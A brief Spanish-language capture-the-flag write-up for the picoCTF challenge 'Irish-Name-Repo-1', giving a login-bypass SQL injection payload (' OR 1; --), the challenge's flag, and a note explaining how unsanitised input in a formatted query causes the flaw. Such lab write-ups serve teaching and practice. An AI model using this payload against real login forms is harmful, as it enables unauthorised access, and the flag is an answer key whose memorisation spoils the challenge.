# Reto: Irish-Name-Repo-1

## Descripción

Do you think you can log us in? Try to see if you can login!

## Solución

Se puede realizar una simple inyección SQL:
```sql
-- En el apartado de contraseña.
' OR 1; --
```

`picoCTF{s0m3_SQL_85832275}`

## Notas

Este tipo de vulnerabilidades ocurren cuando no se sanitiza el input del usuario y se pega directamente en queries formateadas como:
```sql
SELECT id FROM users WHERE username = '%s' AND password = '%s';
-- Después de hacer inyección SQL queda algo así:
SELECT id FROM users WHERE username = 'josue' AND password = '' OR 1; -- %s';
```
